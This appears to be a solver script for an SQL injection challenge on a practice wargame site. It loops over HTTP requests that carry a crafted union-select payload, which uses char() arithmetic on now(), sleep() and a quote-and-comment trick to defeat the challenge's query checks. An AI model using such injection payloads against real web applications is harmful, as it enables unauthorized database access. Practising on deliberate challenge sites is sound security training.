import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/alien_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}

cnt = 0
while True:
    res = requests.get(url, params={'no': 
    '1 union select char(97+now()%2,100,109,105,110) union select sleep(1) #\' union select char(96+now()%2,100,109,105,110) union select sleep(1) #'
    },cookies=cookie)
    print(res.text)
    if res.text.find("Clear") > 0:
        print("Clear!")
        break
    else:
        print("Failed")
        cnt += 1
    if cnt > 15:
        print("Failed 15 times")
        break

